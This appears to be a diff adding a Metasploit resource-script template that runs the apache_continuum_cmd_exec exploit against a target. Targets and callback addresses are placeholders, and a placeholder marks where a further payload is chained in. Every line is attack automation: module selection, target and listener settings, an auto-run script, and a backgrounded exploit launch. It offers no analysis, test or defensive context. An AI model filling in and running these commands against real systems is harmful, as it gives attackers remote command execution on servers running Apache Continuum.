@@ -1,0 +1,8 @@
+use exploit/linux/http/apache_continuum_cmd_exec
+set AutoRunScript multi_console_command -r m.rc
+set RHOSTS __RHOSTS__
+set LHOST __LHOST__
+set LPORT __LPORT__
+exploit -j -z
+__NEXT_PAYLOAD_SRC__
+
